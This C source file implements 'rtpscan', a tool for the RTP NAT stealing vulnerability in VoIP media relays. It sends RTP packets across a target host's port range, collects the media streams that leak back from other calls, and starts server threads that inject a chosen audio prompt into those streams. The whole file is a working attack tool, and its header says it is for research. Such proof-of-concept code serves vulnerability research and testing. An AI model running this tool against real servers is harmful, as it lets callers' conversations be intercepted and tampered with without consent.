/*
 * Copyright 2017 kapejod, all rights reserved.
 *
 * Scanner for RTP NAT stealing vulnerability, for research / educational purposes only!
 * Works only on big endian machines and ipv4 targets.
 */
 
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>
#include <poll.h>
#include <pthread.h>

#include "mmfile.h"
#include "rtp.h"
#include "rtp_scan.h"
#include "rtp_server.h"
#include "rtpp_time.h"

#define MAX_SERVERS 1024

static uint64_t
random64(void)
{
    return (((uint64_t)random() << 32) | random());
}

struct sockaddr_in *create_peer(char *host, int port) {
  struct sockaddr_in *addr = NULL;
  struct hostent *hp = NULL;
  addr = malloc(sizeof(struct sockaddr_in));
  if (!addr) {
    printf("create_peer: unable to malloc peer address\n");
    return NULL;
  }
  memset(addr, 0, sizeof(struct sockaddr_in));
  hp = gethostbyname(host);
  if (!hp) {
    printf("create_peer: unable to resolv host (%s)\n", host);
    free(addr);
    return NULL;
  }

  addr->sin_family = AF_INET;
  addr->sin_port = htons(port);
  bzero(&(addr->sin_zero), 8);
  bcopy(hp->h_addr,(char *)&addr->sin_addr, hp->h_length);
  return addr;
}

struct rtp_receiver_stats {
  pthread_mutex_t lock;
  double last_recv_ts;
  int done;
};

static int
rtp_receiver_isdone(struct rtp_receiver_stats *rrsp)
{
  int rval;

  pthread_mutex_lock(&rrsp->lock);
  rval = rrsp->done;
  pthread_mutex_unlock(&rrsp->lock);
  return (rval);
}

static void
rtp_receiver_setdone(struct rtp_receiver_stats *rrsp)
{

  pthread_mutex_lock(&rrsp->lock);
  rrsp->done = 1;
  pthread_mutex_unlock(&rrsp->lock);
}

static void *
rtp_receiver(void *targ)
{
  const struct rtp_scan_args *rsap;
  union {
    struct rtp_hdr hdr;
    char raw[512];
  } response;
  struct sockaddr_in sender;
  socklen_t sender_len = sizeof(sender);
  struct rtp_server **servers;
  struct pollfd pfds[1];

  rsap = (const struct rtp_scan_args *)targ;

  servers = malloc(sizeof(struct rtp_server *) * MAX_SERVERS);
  memset(servers, '\0', sizeof(struct rtp_server *) * MAX_SERVERS);
  pfds[0].fd = rsap->udp_socket;
  pfds[0].events = POLLIN;

  for (; rtp_receiver_isdone(rsap->rrsp) == 0;) {
    int pres = poll(pfds, 1, 1000);
    if (pres < 0) {
        if (errno == EINTR)
            continue;
        printf("poll() failed with %d\n", errno);
        break;
    }
    if (pres == 0)
        continue;
    int bytes_received = recvfrom(rsap->udp_socket, &response, sizeof(response), 0, (struct sockaddr *)&sender, &sender_len);
    if (bytes_received < sizeof(struct rtp_hdr))
      continue;

    pthread_mutex_lock(&rsap->rrsp->lock);
    rsap->rrsp->last_recv_ts = getdtime();
    pthread_mutex_unlock(&rsap->rrsp->lock);
    uint16_t seq = ntohs(response.hdr.seq);
    int destport = ntohs(sender.sin_port);
    struct rtp_server *sp = NULL;
    for (int i = 0; i < MAX_SERVERS; i++) {
      if (servers[i] == NULL) {
        sp = malloc(sizeof(struct rtp_server));
        memset(sp, '\0', sizeof(struct rtp_server));
        sp->target = sender;
        sp->destport = destport;
        sp->rsap = rsap;
        if (pthread_mutex_init(&sp->lock, NULL) != 0) {
          printf("pthread_mutex_init() failed\n");
          abort();
        }
        if (pthread_create(&sp->sthr, NULL, rtp_server_thread, (void *)sp) != 0) {
          printf("pthread_mutex_init() failed\n");
          abort();
        }
        servers[i] = sp;
        printf("received %d bytes from target port %d, seq %u, pt %u\n", bytes_received, destport, seq, response.hdr.pt);
        break;
      }
      if (servers[i]->destport == destport) {
        sp = servers[i];
        break;
      }
    }
    if (sp == NULL) {
      printf("too many servers\n");
      continue;
    }
    rtp_server_inpkt(sp);
  }
  return (servers);
}

void rtp_scan(char *host, int port_range_start, int port_range_end, struct rtp_scan_args *rsap) {
  struct sockaddr_in *target;
  union {
    struct rtp_hdr hdr;
    char raw[sizeof(struct rtp_hdr) + 512];
  } packet;
  int port;
  int loops;
  struct rtp_receiver_stats rrs = {.last_recv_ts = getdtime(), .done = 0};
  pthread_t rthr;
  int pps = 1000;
  struct rtp_pt_profile pt_prof;
  struct rtp_server **servers;

  rsap->rrsp = &rrs;
  if (rtp_pt_info(rsap->payload.type, &pt_prof) != 0) {
    printf("rtp_pt_info(%d) failed\n", rsap->payload.type);
    return;
  }
  if ((rsap->payload.size % pt_prof.bytes_per_frame) != 0) {
    printf("invalid payload size(%d), should be multiple of %d\n", rsap->payload.size, pt_prof.bytes_per_frame);
    return;
  }
  rsap->payload.tsstep_ms = (rsap->payload.size / pt_prof.bytes_per_frame) * pt_prof.ticks_per_frame;

  int tsstep = RTP_SRATE * rsap->payload.tsstep_ms / 1000;

  target = create_peer(host, port_range_start);
  if (!target) return;

  rsap->udp_socket = socket(PF_INET, SOCK_DGRAM, 0);
  if (rsap->udp_socket == -1) {
    printf("unable to create udp socket\n");
    goto e0;
  }

  memset(&packet, 0, sizeof(packet));
  packet.hdr.version = 2; // RTP version 2
  packet.hdr.pt = rsap->payload.type;
  packet.hdr.mbt = 1; // marker bit set

  if (pthread_mutex_init(&rrs.lock, NULL) != 0) {
    printf("unable to create receiver mutex\n");
    goto e1;
  }
  if (pthread_create(&rthr, NULL, rtp_receiver, (void *)rsap) != 0) {
    printf("unable to create receiver thread\n");
    goto e2;
  }

  printf("scanning %s ports %d to %d with %d packets per port and %d bytes of payload type %d\n",
   host, port_range_start, port_range_end, rsap->ppp, rsap->payload.size, rsap->payload.type);
  for (port = port_range_start; port < port_range_end; port += 2) {
    target->sin_port = htons(port);
    packet.hdr.ssrc = rsap->ssrc_seed % (((uint32_t)port << 14) | (port >> 1));
    uint16_t seq = rsap->seq_seed % (((uint32_t)port << 14) | (port >> 1));
    uint32_t ts = rsap->ts_seed % (((uint32_t)port << 14) | (port >> 1));
    for (loops = 0; loops < rsap->ppp; loops++) {
      packet.hdr.seq = htons(seq + loops); // increase seq with every packet
      packet.hdr.ts = htonl(ts + (loops * tsstep));
      sendto(rsap->udp_socket, &packet, sizeof(struct rtp_hdr) + rsap->payload.size, 0, (const struct sockaddr *)target, sizeof(struct sockaddr_in));
      usleep(1000000 / pps);
    }
  }

  for (;;) {
    pthread_mutex_lock(&rrs.lock);
    double last_recv_ts = rrs.last_recv_ts;
    pthread_mutex_unlock(&rrs.lock);
    if (getdtime() - last_recv_ts > 5.0)
        break;
  }
  rtp_receiver_setdone(&rrs);
  pthread_join(rthr, (void **)&servers);

  for (int i = 0; i < MAX_SERVERS; i++) {
    struct rtp_server *sp = servers[i];
    if (sp == NULL)
      break;
    pthread_join(sp->sthr, NULL);
    printf("Port %d number of packets %d\n", sp->destport, sp->npkts_in);
    pthread_mutex_destroy(&sp->lock);
    free(sp);
  }
  free(servers);

e2:
  pthread_mutex_destroy(&rrs.lock);
e1:
  close(rsap->udp_socket);
e0:
  free(target);
}

static void
seedrandom(void)
{
  int fd;
  unsigned long junk;
  struct timeval tv;

  fd = open("/dev/urandom", O_RDONLY, 0);
  if (fd >= 0) {
    read(fd, &junk, sizeof(junk));
    close(fd);
  } else {
    junk = 0;
  }

    gettimeofday(&tv, NULL);
    srandom((getpid() << 16) ^ tv.tv_sec ^ tv.tv_usec ^ junk);
}

int main(int argc, char *argv[]) {
  seedrandom();
  struct rtp_scan_args rra = {
    .ppp = 4,
    .payload = {
      .size = 160,
      .type = RTP_PCMA
    },
    .ssrc_seed = random64(),
    .seq_seed = random64(),
    .ts_seed = random64()
  };

  if (argc < 5) {
    printf("syntax: rtpscan hostname port_range_start port_range_end prompt [packets_per_port] [payload_size] [payload_type]\n");
    return -1;
  }
  if (minit() < 0) {
    printf("minit() failed\n");
    return (-1);
  }
  rra.playfile = argv[4];
  if (argc >= 6) rra.ppp = atoi(argv[5]);
  if (argc >= 7) rra.payload.size = atoi(argv[6]);
  if (argc == 8) rra.payload.type = atoi(argv[7]);

  rtp_scan(argv[1], atoi(argv[2]), atoi(argv[3]), &rra);
  return 0;
}
